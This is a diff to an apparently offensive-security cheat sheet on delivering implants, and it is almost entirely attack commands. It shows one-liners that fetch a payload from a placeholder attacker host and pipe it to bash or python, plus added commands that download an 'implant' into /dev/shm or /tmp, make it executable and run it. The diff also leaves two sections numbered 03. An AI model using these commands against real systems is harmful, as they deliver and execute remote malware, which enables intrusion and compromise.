@@ -10,12 +10,20 @@ $ curl http[s]://<IP>/implant.sh | bash
 $ curl http[s]://<IP>/implant.py | python
 ```
 
-## 02 - Dropping on disk
+## 02 - Dropping on memory
 
 Download implant and execute it.
 
 ```
-$ curl -o shell.elf http[s]://<IP>/shell.elf && chmod +x shell.elf && ./shell.elf
+$ curl -o /dev/shm/implant http[s]://<IP>/implant && chmod +x /dev/shm/implant && /dev/shm/implant
+```
+
+## 03 - Dropping on disk
+
+Download implant and execute it.
+
+```
+$ curl -o /tmp/implant http[s]://<IP>/implant && chmod +x /tmp/implant && /tmp/implant
 ```
 
 ## 03 - Compiled After Delivery
